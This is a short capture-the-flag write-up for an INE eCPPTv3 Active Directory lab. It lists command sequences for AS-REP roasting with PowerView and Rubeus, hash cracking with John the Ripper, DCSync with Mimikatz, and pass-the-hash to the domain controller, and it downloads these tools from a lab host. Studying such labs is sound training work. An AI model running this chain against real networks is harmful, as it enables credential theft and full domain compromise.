INE - eCPPTv3 - Active Directory Penetration Testing CTF 1


# 1. flag:

You start on machine named Client with the user student.

RDP on the desktop has the target host target.research.security.local saved, with the username set as bobby. Tried the example password password1—successfully logged in.

# 2. flag:

Lets AS-REP Roast.

```
Invoke-WebRequest -Uri "http://10.0.5.101:8080/PowerView.ps1" -Outfile mimi.ps1
powershell -ep bypass
. .\PowerView.ps1
```

List users with DONT_REQ_PREAUTH:
```
Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
```

```
Invoke-WebRequest -Uri "http://10.0.5.101:8080/Rubeus.exe" -Outfile Rubeus.exe
.\Rubeus.exe asreproast /user:johnny /outfile:johnhash.txt
```

```
.\johnTheRipper\john-1.9.0-jumbo-1-win64\run\john.exe .\johnhash.txt --format=krb5asrep -wordlist=.\10k-worst-pass.txt
```

RDP in with johhny for next flag.


# 3. flag:

On CLIENT macine:

```
powershell -ep bypass
. .\PowerView.ps1
Find-LocalAdminAccess
```

 Access the **seclogs.research.SECURITY.local** machine:
 
```
Enter-PSSession seclogs.research.SECURITY.local
```

# 4. flag:

Let’s pivot to the domain controller (prod.research.security.local)—identified via the output of:
nslookup -type=srv _ldap._tcp.dc._msdcs.research.security.local.

```
Invoke-WebRequest -Uri "http://10.0.5.101:8080/Invoke-Mimikatz.ps1" -Outfile mimi.ps1
. .\mimi.ps1

[seclogs.research.SECURITY.local]: PS C:\Users\student.RESEARCH\Documents> Invoke-Mimikatz -Command '"privilege::debug"
"token::elevate" "lsadump::dcsync /domain:research.security.local /user:"CN=Administrator,CN=Users,DC=research,DC=security,DC=l
ocal""'

```

On CLIENT

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:38a...b81d9 /run:powershell.exe"'
```

Now, access the Domain Controller:
```
Enter-PSSession prod.research.SECURITY.local
```
That's it.
